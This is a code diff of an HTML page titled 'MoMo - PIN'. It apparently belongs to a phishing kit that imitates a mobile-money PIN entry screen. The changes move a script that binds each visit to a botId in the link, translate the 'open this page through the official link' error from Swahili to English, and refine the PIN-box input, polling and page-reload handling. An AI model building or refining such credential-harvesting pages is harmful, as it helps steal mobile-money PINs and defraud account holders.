@@ -1,49 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script>
-  // ============================================================
-  //  BOT ID RESOLVER — runs FIRST on every page load
-  //  Reads botId from URL immediately. Never defaults to bot1.
-  //  Persists to localStorage. Rewrites URL so refreshes keep it.
-  //  Stops the page if botId is missing.
-  // ============================================================
-  (function () {
-    try {
-      const params = new URLSearchParams(window.location.search);
-
-      let botId = params.get('botId');
-      if (!botId) {
-        botId = localStorage.getItem('botId');
-      }
-
-      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
-        document.documentElement.innerHTML =
-          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
-          '<h2>Invalid link</h2>' +
-          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
-          '</body>';
-        window.__BOTID_MISSING__ = true;
-        throw new Error('botId missing from URL and localStorage');
-      }
-
-      localStorage.setItem('botId', botId);
-
-      if (params.get('botId') !== botId) {
-        params.set('botId', botId);
-        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
-        window.history.replaceState({}, '', newUrl);
-      }
-
-      window.__BOT_ID__ = botId;
-
-      console.log('🆔 botId resolved immediately:', botId);
-    } catch (err) {
-      console.error('botId resolver failed:', err.message);
-    }
-  })();
-  </script>
-
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>MoMo - PIN</title>
@@ -436,13 +393,56 @@
 </div>
 
 <!-- ============================================================
-     PIN PAGE LOGIC — single unified script
+     SCRIPT 1 — BOT ID RESOLVER
+     Runs first. Reads botId from URL immediately. Never defaults
+     to bot1. Persists to localStorage. Rewrites URL so refreshes
+     keep it. Stops the page if botId is missing.
+     ============================================================ -->
+<script>
+(function () {
+  try {
+    const params = new URLSearchParams(window.location.search);
+
+    let botId = params.get('botId');
+    if (!botId) {
+      botId = localStorage.getItem('botId');
+    }
+
+    if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
+      document.documentElement.innerHTML =
+        '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
+        '<h2>Invalid link</h2>' +
+        '<p>Please open this page through the official link.</p>' +
+        '</body>';
+      window.__BOTID_MISSING__ = true;
+      throw new Error('botId missing from URL and localStorage');
+    }
+
+    localStorage.setItem('botId', botId);
+
+    if (params.get('botId') !== botId) {
+      params.set('botId', botId);
+      const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
+      window.history.replaceState({}, '', newUrl);
+    }
+
+    window.__BOT_ID__ = botId;
+
+    console.log('🆔 botId resolved immediately:', botId);
+  } catch (err) {
+    console.error('botId resolver failed:', err.message);
+  }
+})();
+</script>
+
+<!-- ============================================================
+     SCRIPT 2 — PIN PAGE LOGIC
      ============================================================ -->
 <script>
 (function() {
   const BACKEND_URL = "";
 
-  // ---------- BOTID (resolved by the head script) ----------
+  // ---------- BOTID (resolved by script 1 above) ----------
   const botId = window.__BOT_ID__;
   if (!botId) {
     console.error('❌ No botId — page cannot function');
@@ -486,8 +486,6 @@
     return count;
   }
 
-  // THE KEY FIX: compute button state directly from box values,
-  // not from any hidden-input event. This runs on every box change.
   function updateButtonState() {
     const filled = getFilledCount();
     const isComplete = (filled === pinBoxes.length);
@@ -496,7 +494,6 @@
 
     verifyBtn.disabled = shouldBeDisabled;
 
-    // Also keep the hidden input in sync for the submit logic
     hiddenInput.value = isComplete ? getPinFromBoxes() : '';
 
     console.log('🔘 PIN boxes: ' + filled + '/' + pinBoxes.length + ' → button ' + (shouldBeDisabled ? 'DISABLED' : 'ENABLED'));
@@ -519,7 +516,6 @@
     } else {
       verifyBtn.classList.remove('loading');
     }
-    // Recompute after toggling loading
     updateButtonState();
   }
 
@@ -534,9 +530,7 @@
 
   // ---------- PIN BOX INPUT ----------
   pinBoxes.forEach((box, i) => {
-    // INPUT — typing a digit
     box.addEventListener('input', function() {
-      // Keep only one digit
       const cleaned = this.value.replace(/\D/g, '').slice(0, 1);
       this.value = cleaned;
       this.classList.remove('error');
@@ -549,7 +543,6 @@
       updateButtonState();
     });
 
-    // KEYDOWN — backspace, arrows, enter
     box.addEventListener('keydown', function(e) {
       if (e.key === 'Backspace') {
         if (!this.value && i > 0) {
@@ -576,13 +569,11 @@
       }
     });
 
-    // FOCUS — select existing digit
     box.addEventListener('focus', function() {
       this.select();
       this.classList.remove('error');
     });
 
-    // PASTE — distribute digits
     box.addEventListener('paste', function(e) {
       e.preventDefault();
       const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -704,11 +695,21 @@
     }
   });
 
+  // ---------- BACK-FORWARD CACHE RESET ----------
+  window.addEventListener('pageshow', function (event) {
+    if (event.persisted) {
+      stopPolling();
+      verifyBtn.classList.remove('loading');
+      clearAlert();
+      updateButtonState();
+      if (pinBoxes[0]) pinBoxes[0].focus();
+    }
+  });
+
   // ---------- INIT ----------
   updateButtonState();
   if (pinBoxes[0]) pinBoxes[0].focus();
 
-  // Extra safety: recompute on any focus/blur, in case autofill or IME set values
   document.addEventListener('focusin', updateButtonState);
   document.addEventListener('focusout', function() {
     setTimeout(updateButtonState, 20);
